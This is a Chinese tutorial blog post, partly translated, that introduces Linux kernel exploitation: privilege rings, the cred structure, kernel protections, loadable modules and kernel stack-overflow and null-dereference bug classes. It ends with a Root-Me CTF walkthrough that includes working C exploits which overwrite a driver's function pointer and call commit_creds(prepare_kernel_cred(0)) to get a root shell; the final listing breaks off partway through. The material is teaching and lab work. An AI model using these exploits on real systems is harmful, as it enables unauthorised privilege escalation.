# Kernel Pwn 学习之路(一)

阅读量 **849874**

|评论 **6**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-03-23 16:00:22

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t012b90699683ce2270.jpg)

## 0x01 前言

由于关于Kernel安全的文章实在过于繁杂，本文有部分内容大篇幅或全文引用了参考文献，若出现此情况的，将在相关内容的开头予以说明，部分引用参考文献的将在文件结尾的参考链接中注明。

本文主要介绍了Kernel的相关知识以及栈溢出在Kernel中的利用，更多的利用思路以及更多的实例将在后续文章中说明

## 0x02 kernel简介

📚：本部分全文引用了[CTF-Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/)的相关内容。

###  什么是Kernel

kernel 也是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel
是现代操作系统最基本的部分。

![](https://img.lhyerror404.cn/error404/2020-03-13-Kernel_Layout.svg)

kernel 最主要的功能有两点：

  1. 控制并与硬件进行交互
  2. 提供 application 能运行的环境

包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。

需要注意的是， **kernel 的 crash 通常会引起重启** 。

###  Ring Model

intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。

Ring 0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。

使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3
运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。

大多数的现代操作系统只使用了 Ring 0 和 Ring 3。

###  Model Change

####  user space to kernel space

当发生 `系统调用`，`产生异常`，`外设产生中断`等事件时，会发生用户态到内核态的切换，具体的过程为：

  1. 通过 `swapgs` 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。
  2. 将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入`RSP/ESP`。
  3. 通过 push 保存各寄存器值，具体的 [代码](http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S) 如下: 
    
        ENTRY(entry_SYSCALL_64)
    /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
    SWAPGS_UNSAFE_STACK
    
    /* 保存栈值，并设置内核栈 */
    movq %rsp, PER_CPU_VAR(rsp_scratch)
    movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
    
    /* 通过push保存寄存器值，形成一个pt_regs结构 */
    /* Construct struct pt_regs on stack */
    pushq  $__USER_DS                /* pt_regs->ss */
    pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
    pushq  %r11                      /* pt_regs->flags */
    pushq  $__USER_CS                /* pt_regs->cs */
    pushq  %rcx                      /* pt_regs->ip */
    pushq  %rax                      /* pt_regs->orig_ax */
    pushq  %rdi                      /* pt_regs->di */
    pushq  %rsi                      /* pt_regs->si */
    pushq  %rdx                      /* pt_regs->dx */
    pushq  %rcx tuichu               /* pt_regs->cx */
    pushq  $-ENOSYS                  /* pt_regs->ax */
    pushq  %r8                       /* pt_regs->r8 */
    pushq  %r9                       /* pt_regs->r9 */
    pushq  %r10                      /* pt_regs->r10 */
    pushq  %r11                      /* pt_regs->r11 */
    sub $(6*8), %rsp                 /* pt_regs->bp, bx, r12-15 not saved */
    

  4. 通过汇编指令判断是否为 `x32_abi`。
  5. 通过系统调用号，跳到全局变量 `sys_call_table` 相应位置继续执行系统调用。

####  kernel space to user space

退出时，流程如下：

  1. 通过 `swapgs` 恢复 GS 值
  2. 通过 `sysretq` 或者 `iretq` 恢复到用户控件继续执行。如果使用 `iretq` 还需要给出用户空间的一些信息(`CS, eflags/rflags, esp/rsp` 等)

####  关于 syscall

系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如
scanf，puts 等 IO 相关的函数实际上是对系统调用的封装 （read 和 write)）。

> 在 _/usr/include/x86_64-linux-gnu/asm/unistd_64.h_ 和
> _/usr/include/x86_64-linux-gnu/asm/unistd_32.h_ 分别可以查看 64 位和 32 位的系统调用号。
>
> 同时推荐一个很好用的网站 [Linux Syscall
> Reference](https://syscalls.kernelgrok.com/)，可以查阅 32 位系统调用对应的寄存器含义以及源码。64
> 位系统调用可以查看 [Linux Syscall64 Reference](https://syscalls64.paolostivanin.com/)

####  关于 ioctl

在 man 手册中，关于这个函数的说明如下：

    
    
    NAME
           ioctl - control device
    SYNOPSIS
           #include <sys/ioctl.h>
           int ioctl(int fd, unsigned long request, ...);
    
    DESCRIPTION
           The ioctl() system call manipulates the underlying device parameters of special
           files.  In particular, many  operating  characteristics  of  character  special
           files  (e.g., terminals) may be controlled with ioctl() requests.  The argument
           fd must be an open file descriptor.
    
           The second argument is a device-dependent request code.  The third argument  is
           an  untyped  pointer  to  memory.  It's traditionally char *argp (from the days
           before void * was valid C), and will be so named for this discussion.
    
           An ioctl() request has encoded in it whether the argument is an in parameter or
           out  parameter, and the size of the argument argp in bytes.  Macros and defines
           used in specifying an ioctl() request are located in the file <sys/ioctl.h>.
    

可以看出 ioctl 也是一个系统调用，用于与设备通信。

`int ioctl(int fd, unsigned long request, ...)` 的第一个参数为打开设备 (open) 返回的
[文件描述符](http://m4x.fun/post/play-with-file-descriptor-1/)，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。

> 使用 ioctl 进行通信的原因：
>
> 操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址, 但是当访问非标准硬件设备这些系统调用显得不合适,
> 有时候用户模式可能需要直接访问设备。
>
>
> 比如，一个系统管理员可能要修改网卡的配置。现代操作系统提供了各种各样设备的支持，有一些设备可能没有被内核设计者考虑到，如此一来提供一个这样的系统调用来使用设备就变得不可能了。
>
> 为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 Ioctl
> 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 Ioctl
> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。

###  内核态函数调用

相比用户态库函数，内核态的函数有了一些变化：

  1. `printf()`变更为 **`printk()`** ，但需要注意的是`printk()` **不一定会把内容显示到终端上，但一定在内核缓冲区里** ，可以通过 `dmesg` 查看效果。
  2. `memcpy()` 变更为 **`copy_from_user()/copy_to_user()`**
    * copy_from_user() 实现了将用户空间的数据传送到内核空间
    * copy_to_user() 实现了将内核空间的数据传送到用户空间
  3. `malloc()`变更为 **`kmalloc()`** ，内核态的内存分配函数，和`malloc()`相似，但使用的是 `slab/slub` 分配器
  4. `free()`变更为 **`kfree()`** ，同 `kmalloc()`

同时，`kernel`负责管理进程，因此 kernel 也记录了进程的权限。`kernel`中有两个可以方便的改变权限的函数：

  1. **`int commit_creds(struct cred *new)`**
  2. **`struct cred* prepare_kernel_cred(struct task_struct* daemon)`**

**从函数名也可以看出，执行`commit_creds(prepare_kernel_cred(0))` 即可获得 root 权限，0 表示 以 0
号进程作为参考准备新的 credentials。**

> 更多关于 `prepare_kernel_cred` 的信息可以参考
> [源码](https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594)

执行 `commit_creds(prepare_kernel_cred(0))` 也是最常用的提权手段，两个函数的地址都可以在
`/proc/kallsyms` 中查看（较老的内核版本中是 `/proc/ksyms`）。

![](https://img.lhyerror404.cn/error404/2020-03-14-082459.png)

⚠️： **一般情况下，/proc/kallsyms 的内容需要 root 权限才能查看，若以非root权限查看将显示为0地址。**

###  struct cred – 进程权限结构体

内核使用`cred`结构体记录进程的权限，每个进程中都有一个 cred
结构，这个结构保存了该进程的权限等信息(`uid，gid`等），如果能修改某个进程的`cred`，那么也就修改了这个进程的权限。结构体[源码](https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred)如下:

    
    
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;           /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;                   /* real UID of the task */
        kgid_t      gid;                   /* real GID of the task */
        kuid_t      suid;                  /* saved UID of the task */
        kgid_t      sgid;                  /* saved GID of the task */
        kuid_t      euid;                  /* effective UID of the task */
        kgid_t      egid;                  /* effective GID of the task */
        kuid_t      fsuid;                 /* UID for VFS ops */
        kgid_t      fsgid;                 /* GID for VFS ops */
        unsigned    securebits;            /* SUID-less security management */
        kernel_cap_t    cap_inheritable;   /* caps our children can inherit */
        kernel_cap_t    cap_permitted;     /* caps we're permitted */
        kernel_cap_t    cap_effective;     /* caps we can actually use */
        kernel_cap_t    cap_bset;          /* capability bounding set */
        kernel_cap_t    cap_ambient;       /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char   jit_keyring;       /* default keyring to attach requested
        /* keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key  *process_keyring;      /* keyring private to this process */
        struct key  *thread_keyring;       /* keyring private to this thread */
        struct key  *request_key_auth;     /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;             /* subjective LSM security */
    #endif
        struct user_struct *user;          /* real user ID subscription */
        struct user_namespace *user_ns;    /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;     /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;               /* RCU deletion hook */
    } __randomize_layout;
    

###  内核保护机制

  1. smep: Supervisor Mode Execution Protection，当处理器处于 `ring 0` 模式，执行 **用户空间** 的代码会触发页错误。（在 arm 中该保护称为 `PXN`)
  2. smap: Superivisor Mode Access Protection，类似于 smep，当处理器处于 `ring 0` 模式，访问 **用户空间** 的数据会触发页错误。
  3. MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。
  4. KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。

⚠️： **Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。**

## 0x03 LKMs 介绍

###  什么是LKMs

LKMs(Loadable Kernel Modules)称为可加载核心模块(内核模块)，其可以看作是运行在内核空间的可执行程序，包括:

  * 驱动程序（Device drivers） 
    * 设备驱动
    * 文件系统驱动
    * …
  * 内核扩展模块 (modules)

LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用
IDA 等工具来分析内核模块。

模块可以被单独编译， **但不能单独运行** 。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。

模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。

> Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic
> kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。

**通常情况下，Kernel漏洞的发生也常见于加载的LKMs出现问题。**

###  内核中的模块相关指令

  1. **insmod** : 将指定模块加载到内核中。
  2. **rmmod** : 从内核中卸载指定模块。
  3. **lsmod** : 列出已经加载的模块。
  4. **modprobe** : 添加或删除模块，modprobe 在加载模块时会查找依赖关系。

###  file_operations 结构体

用户进程在对设备文件进行诸如read/write操作的时候，
**系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。**

内核模块程序的结构中包括一些call
back回调表，对应的函数存储在一个file_operations(fop)结构体中，这也是相当重要的结构体，结构体中实现了的回调函数就会静态初始化函数地址，而未实现的函数，值为NULL。

例如：

Events | User functions | Kernel functions  
---|---|---  
Load | insmod | module_init()  
Open | fopen | file_operations: open  
Close | fread | file_operations: read  
Write | fwrite | file_operations: write  
Close | fclose | file_operations: release  
Remove | rmmod | module_exit()  
      
    
    #include <linux/init.h>
    #include <linux/module.h>
    #include <linux/kernel.h>
    MODULE_LICENSE("Dual BSD/GPL");
    static int hello_init(void) 
    {
        printk("<1> Hello world!n");
        return 0;
    }
    static void hello_exit(void) 
    {
        printk("<1> Bye, cruel worldn");
    }
    module_init(hello_init);
    module_exit(hello_exit);
    struct file_operations module_fops = 
    {
        read: module_read,
        write: module_write,
        open: module_open,
        release: module_release
    };
    

其中，module_init/module_exit是在载入/卸载这个驱动时自动运行；而fop结构体实现了如上四个callback，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序程序就可以借助
**文件方式** 像进行系统调用一样调用这些函数实现所需功能。

## 0x04 环境配置

不同于用户态的pwn，Kernel-Pwn不再是用python远程链接打payload拿shell，而是给你一个环境包，下载后qemu本地起系统。对于一个Kernel-Pwn来说，题目通常会给定以下文件：

    
    
    boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关
    bzImage: kernel binary
    rootfs.cpio: 文件系统映像
    

解释一下 qemu 启动的参数：

  * -initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统
  * -kernel bzImage，使用 bzImage 作为 kernel 映像
  * -cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep
  * -m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 —help 查看。

本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl,
uclibc 等方法减小 exploit 的体积方便传输。

但是为了我们调试Demo方便，我们最好在本地也编译一个bzImage。

⚠️：部分Kernel漏洞只影响低版本，高版本的Kernel已对脆弱的机制进行了一定程度的遏制乃至进行了消除，但是和Glibc相同，部分中低版本的内核仍有很高的用户量，因此我们对于低版本Kernel的漏洞研究并非是没有意义的，同时，在实际调试Demo时，请特别注意Demo漏洞影响的Kernel版本。

⚠️：以下安装步骤仅在`Ubuntu 16.04`完成了测试。

###  下载Linux Kernel源码并解压

`wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.5.6.tar.xz`

###  配置环境

编译kernel需要很多lib，所以请执行以下命令安装相关环境：

`sudo apt-get install bison libncurses* build-essential openssl zlibc minizip
libidn11-dev libidn11 libssl-dev flex ncurses-devel libncurses5-dev`

###  Kernel编译配置

运行以下命令进行配置即可

`make menuconfig`

配置结束会在当前目录生成`.config`，若需要之后修改配置，可以直接编辑`.config`后再次编译即可。

###  编译

使用`make`进行编译即可，若需要更快的编译，请使用`make -j8`。

## 0x05 Kernel Stackoverflow

📚：本部分全文翻译自[Exploiting Stack Overflows in the Linux Kernel – Jon
Oberheide](https://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/)的相关内容。

此处将介绍Linux内核中堆栈溢出的利用技术。请注意，这并不是指内核堆栈上的缓冲区溢出，而是内核堆栈的不正确扩展，这导致其可能与损坏的关键结构重叠。
这是Linux内核中的一个漏洞类。

###  内核栈帧(Kernel Stack Layout)

在Linux上，每个系统线程都在内核内存中分配了相应的内核堆栈。 x86上的Linux内核堆栈的大小为4096或8192字节，这具体取决于您的发行版。
尽管此大小似乎小到无法包含完整的调用链和相关的本地堆栈变量，但实际上内核调用链相对较浅，并且在Kernel中不鼓励滥用带有大局部堆栈变量的内核函数来占用宝贵空间，当使用高效的分配器(如SLUB)时，这个大小是完全够用的。

内核堆栈与thread_info结构共享4k / 8k的总大小，该结构包含有关当前线程的一些元数据，如`include/linux/sched.h`中所示：

    
    
    union thread_union {
        struct thread_info thread_info;
        unsigned long stack[THREAD_SIZE/sizeof(long)];
    };
    

thread_info结构在x86下有如下定义：(`arch/x86/include/asm/thread_info.h`)

    
    
    struct thread_info {
        struct task_struct *task;
        struct exec_domain *exec_domain;
        __u32      flags;
        __u32      status;
        __u32      cpu;
        int          preempt_count;
        mm_segment_t  addr_limit;
        struct restart_block restart_block;
        void __user     *sysenter_return;
    #ifdef CONFIG_X86_32
        unsigned long  previous_esp;
        __u8      supervisor_stack[0];
    #endif
        int          uaccess_err;
    };
    

内核堆栈在内存中呈现如下所示的结构：

![](https://img.lhyerror404.cn/error404/2020-03-15-061423.png)

那么，当内核函数需要超过4k / 8k的堆栈空间或使用了长调用链以至于超出可用堆栈空间时，会发生什么呢？

**通常情况下，这会导致堆栈溢出的发生，并且如果thread_info结构或超出更低地址处的关键内存损坏，则会导致内核崩溃。
但是，如果内存对齐并且存在实际可以控制写入堆栈及其以外的数据的情况，则可能存在可利用的条件。**

###  Kernel栈溢出攻击

接下来让我们看一看栈溢出和thread_info结构的破坏是如何导致提权的发生的。

    
    
    static int blah(int __user *vals, int __user count)
    {
        int i;
        int big_array[count];
        for (i = 0; i < count; ++count) {
            big_array[i] = vals[i];
        }
    }
    

在上面的代码中，在内核堆栈上有被分配了一个可变长度的数组(big_array)，其大小基于攻击者控制的`count`。
C99允许使用可变长度数组，并且GCC支持可变长度数组。 GCC将在运行时简单地计算必要的大小，并适当减少堆栈指针，以在堆栈上为数组分配空间。

但是，如果攻击者提供了一个极大的`count`，则堆栈可能向下扩展到`thread_info`的边界之外，从而允许攻击者随后将任意值写入`thread_info`结构。
将堆栈指针扩展到`thread_info`边界之外，如下图所示：

![](https://img.lhyerror404.cn/error404/2020-03-15-062453.png)

那么thread_info结构中有什么我们可以利用的target呢？在理想情况下，我们希望找到一个函数指针的东西，当我们可以控制一个函数指针时我们事实上就可以劫持程序流程了。

此处我们就要提到thread_info中的一个成员了：restart_block。
restart_block是每个线程的结构，用于跟踪信息和参数以供重新启动系统调用。
如果在sigaction(2)中指定了SA_RESTART，则被信号中断的系统调用可以中止并返回EINTR，也可以自动自行重启。
在`include/linux/thread_info.h`中，restart_block的定义如下:

    
    
    struct restart_block {
        long (*fn)(struct restart_block *);
        union {
            struct {
                ...
            };
            /* For futex_wait and futex_wait_requeue_pi */
            struct {
                ...
            } futex;
            /* For nanosleep */
            struct {
                ...
            } nanosleep;
            /* For poll */
            struct {
                ...
            } poll;
        };
    };
    

我们发现了一个fn的函数指针！假如我们可以控制那个函数指针，那么我们一定可以劫持EIP。那么，这个fn指针会在哪里被调用呢？

事实上，我们可以在`kernel/signal.c`中找到如下代码：

    
    
    SYSCALL_DEFINE0(restart_syscall)
    {
        struct restart_block *restart = &current_thread_info()->restart_block;
        return restart->fn(restart);
    }
    

而`restart_syscal`l在`arch/x86/kernel/syscall_table_32.S`中被定义：

    
    
    .long sys_restart_syscall /* 0 - old "setup()" system call, used for restarting */
    

实际上它的系统调用号码为零。 我们可以通过以下方式从用户态中调用其功能：

    
    
    syscall(SYS_restart_syscall);
    

这将使内核调用调用在restart_block结构中的函数指针。

**如果我们可以破坏thread_info的restart_block成员中的函数指针，则可以将其指向我们控制下的用户空间中的函数，通过调用sys_restart_syscall触发其执行，并提升特权。**

###  Linux 提权思路

之前说过，执行`commit_creds(prepare_kernel_cred(0))`，可以使进程的权限提升为`root`，然后我们返回到用户模式，执行`iret`指令。

#### <a name=”关于`iret`指令” class=”reference-link”>关于`iret`指令

当使用IRET指令返回到相同保护级别的任务时，IRET会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。

当使用IRET指令返回到一个不同的保护级别时，IRET不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。

栈上保存了`trap frame`，返回到用户模式的时候，恢复信息从以下得得结构读取：

    
    
    struct trap_frame 
    {
        void* eip;                // instruction pointer +0
        uint32_t cs;              // code segment    +4
        uint32_t eflags;          // CPU flags       +8
        void* esp;                // stack pointer       +12
        uint32_t ss;              // stack segment   +16
    } __attribute__((packed));
    

## 0x06 Kernel Null Pointer Dereference

📚：本部分部分翻译自[A Kernel Exploit Step by Step –
akliilias](https://www.coursehero.com/file/49274885/kernel-exploit-step-by-steppdf/)的相关内容。

2009年8月，Tavis Ormandy和Julien Tinnes发现了一个漏洞，该漏洞影响了自2001年以来的所有2.4到2.6Linux内核。  
问题的根源是因为以下机制：在Linux操作系统中，虚拟内存分配于内核空间和用户空间之间。
在x86上，每个进程都有一个内存映射，该内存映射分为两部分，用户空间最大为3GB（地址0xC0000000），最后一个GB是为内核保留的。
尽管存在特权分离，但它们都共享相同的地址空间。

###  Demo

    
    
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/mman.h>
    int main(){
        uint32_t *mem=NULL;
        mem=mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE, 0, 0);
        if (mem != NULL) {
            fprintf(stdout,"[−] UNABLE TO MAP ZERO PAGE!n");
            exit(0);
        }
        fprintf(stdout, "[+] MAPPED ZERO PAGE!n");
        printf("0x%08X: 0x%08X n",(uint32_t)mem, *(uint32_t*)0);
        mem[0] = 0xDEADBEAF;
        printf("0x%08X: 0x%08X n",(uint32_t)mem, *(uint32_t*)0);
        printf("[+] It worked !!n");
        munmap(mem,0x1000);
        mem[0] = 0xDEADBEAF;
        return 0;
    }
    

这个Demo试图使用`mmap`在`NULL`处分配0x1000大小的内存映射，正常情况下，程序应当返回`[−] UNABLE TO MAP ZERO
PAGE!n`。

![](https://img.lhyerror404.cn/error404/2020-03-16-140747.png)

但是，在某些版本的Kernel上，这个Demo却可以向下运行，进而使我们分配到0地址的映射，那么我们就可以直接在0地址处构建shellcode并执行。

## 0x07 以[Root-Me]LinKern x86 – Buffer overflow basic 1为例

题目给定了`bzImage、ch1.c、initramfs.img、run、run.c`这几个文件

其中`bzImage`为内存映像，那么`initramfs.img`必定为文件系统，解压可以发现加载到内核的模块文件。

事实上，此时我们已经可以通过如下命令：

    
    
    qemu-system-i386 -kernel bzImage 
    -s 
    -append nokaslr 
    -initrd initramfs.img 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/Buffer_overflow_basic_1/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
    

来启动这个Kernel。

**🚫：此处若使用Mac os下的`qemu-system`将会显示`There is no option group
'fsdev'`错误，因此请使用Ubuntu作为调试环境。**

![](https://img.lhyerror404.cn/error404/2020-03-15-045351.png)

###  分析Init文件

    
    
    #!/bin/sh
    
    mount -t devtmpfs none /dev
    mount -t proc proc /proc
    mount -t sysfs sysfs /sys
    
    #
    # flag
    #
    mkdir -p /passwd
    mount -t ext2 -o ro /dev/sda /passwd
    
    #
    # share
    #
    mkdir -p /mnt/share
    mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync
    chmod 777 /mnt/share/
    
    #
    # module
    #
    insmod /lib/modules/*/rootme/*.ko
    chmod 666 /dev/tostring 
    # mmap_min_addr to 0 for the challenge to be simpler for now ;)
    echo 0 > /proc/sys/vm/mmap_min_addr
    
    #
    # shell
    #
    cat /etc/issue
    export ENV=/etc/profile
    setsid cttyhack setuidgid 1000 sh
    
    umount /proc
    umount /sys
    umount /dev
    
    poweroff -f
    

程序将位于`/lib/modules/*/rootme/*.ko`的LKMs文件使用`insmod`命令加载到Kernel。

在那之后， **解除了`mmap_min_addr`保护**。

并且可以看出，我们需要读取的flag将位于`/dev/sda`。

###  LKMs文件分析

![](https://img.lhyerror404.cn/error404/2020-03-15-045743.png)

仅开启了LKMs保护，并且题目提示没有开启其余保护，那么我们使用IDA分析该文件。

####  tostring_init()

![](https://img.lhyerror404.cn/error404/2020-03-15-083642.png)

首先，程序使用`alloc_chrdev_region`函数，来让内核自动给我们分配设备号。

然后程序创建一个设备类，命名为`chrdrv`。

接下来创建设备节点，成功后则开始初始化`cdev`。可以看出，这是一个字符设备，而这个字符设备为我们提供了几个函数。那么我们可以写一个PoC直接调用相关函数。

####  tostring_open()

打印`'6Tostring: open()'`后返回。

####  tostring_read(int a1)

打印`'6Tostring: read()'`后，将传入的值作为参数调用`0x8000984`。

####  tostring_read_dec(size_t maxlen, char *s)

打印`'6Tostring: read_dec()'`后，若`tostring`的值大于零，将`[0x8000784 + 2 * (tostring -1)]`使用`snprintf`按`"%lldn"`格式化后打印最多`maxlen`个字节到传入的参数`s`中并返回，在那之后，`tostring-1`。

####  tostring_read_hexa(size_t maxlen, char *s)

与`tostring_read_dec(size_t maxlen, char *s)`类似，只不过，这次程序将打印信息换为了`6Tostring:
read_hexa()`，格式化控制符换为了`"%16llxn"`。

####  tostring_write(int a1, int a2)

打印`'6Tostring:
write()'`后，程序将分配一个Chunk，然后将a2的前a1个字节读入Chunk，同时，我们输入的数据若以`MH`或`MD`开头，将改变`0x8000984`处的值到底是`tostring_read_dec`亦或是`tostring_read_hexa`。若输入的数据不以`MH`或`MD`开头，程序将Chunk的地址置于`0x8000784
+ 2 * tostring`处。随后，`tostring + 1`。

####  echo测试

我们使用`echo "1111" > /dev/tostring`来测试设备是否挂载正常

![](https://img.lhyerror404.cn/error404/2020-03-16-033040.png)

发现程序正常的调用了我们分析的函数链。

###  动态调试

对于内核的调试，我们首先需要知道我们的LKMs被加载到了程序的哪个位置，也就是需要知道其`.text、.bss、.data`节区地址。

对于这些地址，它们通常会被保存到系统的`/sys/module/[模块名]`目录下。

⚠️：此处注意，我们加载到内核的模块名不一定是模块文件的名字，可以使用`lsmod`命令查看。

![](https://img.lhyerror404.cn/error404/2020-03-16-043313.png)

接下来我们来查看节区地址：

![](https://img.lhyerror404.cn/error404/2020-03-16-043609.png)

接下来我们可以使用`add-symbol-file`这个gdb命令向gdb指定这三个地址。

![](https://img.lhyerror404.cn/error404/2020-03-16-043959.png)

然后就可以附加调试了，我们将断点下在write函数的入口处。

![](https://img.lhyerror404.cn/error404/2020-03-16-044555.png)

成功下断。

###  LKMs漏洞分析

可以看到，程序在读入我们发送的值时，没有做长度限定，那么，我们事实上可以读入任意长字节。

而程序的`0x08000984`处存储了我们read时即将调用的指针，那么我们完全可以覆盖掉那个指针为我们想要其为的值。

![](https://img.lhyerror404.cn/error404/2020-03-16-092434.png)

控制其的PoC为：

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    int main(){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        int fd = open("/dev/tostring",O_WRONLY);
        for(int i = 0;i < 0x40; i++)
            write(fd,Padding,sizeof(Padding));
        write(fd,Eip,sizeof(Eip));
        return 0;
    }
    

![](https://img.lhyerror404.cn/error404/2020-03-16-093750.png)

可以发现，我们的确可以控制那个函数指针。

我们可以通过查看`/proc/kallsyms`来定位提权用函数的地址。

![](https://img.lhyerror404.cn/error404/2020-03-16-113302.png)

我们可以构造如下所示的`Exploit`:

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stdint.h>
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i < 0x40; i++)
            write(fd,Padding,sizeof(Padding));
        write(1,Eip,sizeof(Eip));
        *((void**)(Eip)) = &payload;
        write(fd,Eip,sizeof(Eip));
        return 0;
    }
    

可以发现，核心利用代码已被注入，接下来只要调用read函数将会调用我们的利用逻辑。

![](https://img.lhyerror404.cn/error404/2020-03-16-120307.png)

###  Final Exploit

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <string.h>
    #include <stdint.h>
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5];
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i < 0x40; i++)
            write(fd,Padding,sizeof(Padding));
